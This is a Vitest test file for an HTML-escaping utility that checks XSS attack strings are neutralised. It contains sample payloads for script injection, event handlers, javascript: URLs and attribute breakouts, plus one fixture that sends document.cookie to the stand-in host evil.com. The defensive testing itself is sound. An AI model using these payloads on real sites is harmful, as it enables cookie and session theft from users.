/**
 * HTML Escape Tests
 * Phase 102: XSS Prevention Tests
 *
 * Verifies that escapeHtml properly escapes all XSS attack vectors.
 */

import { describe, test, expect } from "vitest";
import { escapeHtml, unescapeHtml } from "../html-escape";

describe("escapeHtml - XSS Prevention", () => {
  describe("script injection attacks", () => {
    test("escapes basic script tags", () => {
      const malicious = '<script>alert("xss")</script>';
      const result = escapeHtml(malicious);

      expect(result).not.toContain("<script>");
      expect(result).not.toContain("</script>");
      expect(result).toContain("&lt;script&gt;");
      expect(result).toContain("&lt;&#x2F;script&gt;");
    });

    test("escapes script with single quotes", () => {
      const malicious = "<script>alert('xss')</script>";
      const result = escapeHtml(malicious);

      expect(result).not.toContain("<script>");
      expect(result).toContain("&#x27;xss&#x27;");
    });

    test("escapes script with backticks", () => {
      const malicious = "<script>alert(`xss`)</script>";
      const result = escapeHtml(malicious);

      expect(result).not.toContain("<script>");
      expect(result).toContain("&#x60;xss&#x60;");
    });
  });

  describe("event handler attacks", () => {
    test("escapes img onerror handler", () => {
      const malicious = '<img src=x onerror="alert(1)">';
      const result = escapeHtml(malicious);

      // The < and > are escaped, so browser won't interpret as HTML tag
      expect(result).not.toContain("<img");
      expect(result).not.toContain(">");
      expect(result).toContain("&lt;img");
      expect(result).toContain("&gt;");
      // Quotes are escaped preventing attribute injection
      expect(result).toContain("&quot;alert(1)&quot;");
    });

    test("escapes svg onload handler", () => {
      const malicious = '<svg onload="alert(1)">';
      const result = escapeHtml(malicious);

      expect(result).not.toContain("<svg");
      expect(result).toContain("&lt;svg");
    });

    test("escapes div onclick handler", () => {
      const malicious = '<div onclick="alert(1)">click me</div>';
      const result = escapeHtml(malicious);

      expect(result).not.toContain("<div");
      expect(result).toContain("&lt;div");
    });
  });

  describe("javascript URL attacks", () => {
    test("escapes javascript: URL in anchor", () => {
      const malicious = '<a href="javascript:alert(1)">click</a>';
      const result = escapeHtml(malicious);

      expect(result).not.toContain("<a");
      expect(result).not.toContain("href=");
      expect(result).toContain("&lt;a");
    });
  });

  describe("HTML entity bypass attempts", () => {
    test("escapes ampersand to prevent entity bypass", () => {
      const malicious = "&lt;script&gt;";
      const result = escapeHtml(malicious);

      // The & should be escaped, preventing entity interpretation
      expect(result).toContain("&amp;lt;");
    });

    test("escapes nested encoding attempts", () => {
      const malicious = "&#60;script&#62;";
      const result = escapeHtml(malicious);

      expect(result).toContain("&amp;#60;");
    });
  });

  describe("special character escaping", () => {
    test("escapes less than sign", () => {
      expect(escapeHtml("<")).toBe("&lt;");
    });

    test("escapes greater than sign", () => {
      expect(escapeHtml(">")).toBe("&gt;");
    });

    test("escapes ampersand", () => {
      expect(escapeHtml("&")).toBe("&amp;");
    });

    test("escapes double quote", () => {
      expect(escapeHtml('"')).toBe("&quot;");
    });

    test("escapes single quote", () => {
      expect(escapeHtml("'")).toBe("&#x27;");
    });

    test("escapes forward slash", () => {
      expect(escapeHtml("/")).toBe("&#x2F;");
    });

    test("escapes backtick", () => {
      expect(escapeHtml("`")).toBe("&#x60;");
    });

    test("escapes equals sign", () => {
      expect(escapeHtml("=")).toBe("&#x3D;");
    });
  });

  describe("safe content handling", () => {
    test("preserves plain text", () => {
      const safe = "Hello, World!";
      expect(escapeHtml(safe)).toBe("Hello, World!");
    });

    test("preserves numbers", () => {
      const safe = "Price: 1,234.56";
      expect(escapeHtml(safe)).toBe("Price: 1,234.56");
    });

    test("preserves Unicode characters", () => {
      const safe = "Labas rytas! Ąčęėįšųūž";
      expect(escapeHtml(safe)).toBe("Labas rytas! Ąčęėįšųūž");
    });

    test("preserves newlines", () => {
      const safe = "Line 1\nLine 2\n\nLine 3";
      expect(escapeHtml(safe)).toBe("Line 1\nLine 2\n\nLine 3");
    });

    test("preserves spaces and tabs", () => {
      const safe = "  indented\t\ttabbed";
      expect(escapeHtml(safe)).toBe("  indented\t\ttabbed");
    });
  });

  describe("edge cases", () => {
    test("handles empty string", () => {
      expect(escapeHtml("")).toBe("");
    });

    test("handles null gracefully", () => {
      expect(escapeHtml(null as unknown as string)).toBe("");
    });

    test("handles undefined gracefully", () => {
      expect(escapeHtml(undefined as unknown as string)).toBe("");
    });

    test("handles number input", () => {
      expect(escapeHtml(123 as unknown as string)).toBe("123");
    });

    test("handles object with dangerous toString", () => {
      const malicious = {
        toString: () => '<script>alert("xss")</script>',
      };
      const result = escapeHtml(malicious as unknown as string);
      expect(result).not.toContain("<script>");
    });
  });

  describe("real-world variable injection scenarios", () => {
    test("escapes malicious company name", () => {
      const maliciousCompany = '<script>document.location="http://evil.com?c="+document.cookie</script>Acme Corp';
      const result = escapeHtml(maliciousCompany);

      expect(result).not.toContain("<script>");
      expect(result).toContain("Acme Corp");
    });

    test("escapes XSS in email field", () => {
      const maliciousEmail = '"><script>alert(1)</script><input value="';
      const result = escapeHtml(maliciousEmail);

      expect(result).not.toContain("<script>");
      expect(result).not.toContain("<input");
    });

    test("escapes attribute breakout attempt", () => {
      const malicious = '" onmouseover="alert(1)" data-x="';
      const result = escapeHtml(malicious);

      expect(result).not.toContain('"');
      expect(result).toContain("&quot;");
    });
  });
});

describe("unescapeHtml", () => {
  test("unescapes all HTML entities", () => {
    const escaped = "&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;";
    const result = unescapeHtml(escaped);

    expect(result).toBe('<script>alert("xss")</script>');
  });

  test("handles empty string", () => {
    expect(unescapeHtml("")).toBe("");
  });

  test("handles plain text", () => {
    expect(unescapeHtml("Hello World")).toBe("Hello World");
  });

  test("round-trips correctly", () => {
    const original = '<script>alert("test")</script>';
    const escaped = escapeHtml(original);
    const unescaped = unescapeHtml(escaped);

    expect(unescaped).toBe(original);
  });
});
